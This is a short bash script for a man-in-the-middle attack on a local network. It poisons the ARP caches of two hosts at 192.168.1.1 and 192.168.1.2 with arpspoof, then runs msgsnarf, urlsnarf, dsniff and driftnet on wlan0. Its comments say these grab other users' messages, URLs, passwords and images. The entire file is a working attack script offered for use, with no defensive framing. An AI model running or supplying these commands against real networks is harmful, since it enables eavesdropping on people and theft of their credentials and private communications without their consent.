#!/bin/bash

# arpcache posioning

sudo arpspoof -t 192.168.1.1 192.168.1.2

sudo arpspoof -t 192.168.1.2 192.168.1.1

# msgsnarf for grabbing messages
msgsnarf -i wlan0 

# urlsnarf grab urls
urlsnarf -i wlan0

# dsniff grab passwords
dsniff -i wlan0

# driftnet grab images
driftnet -i wlan0
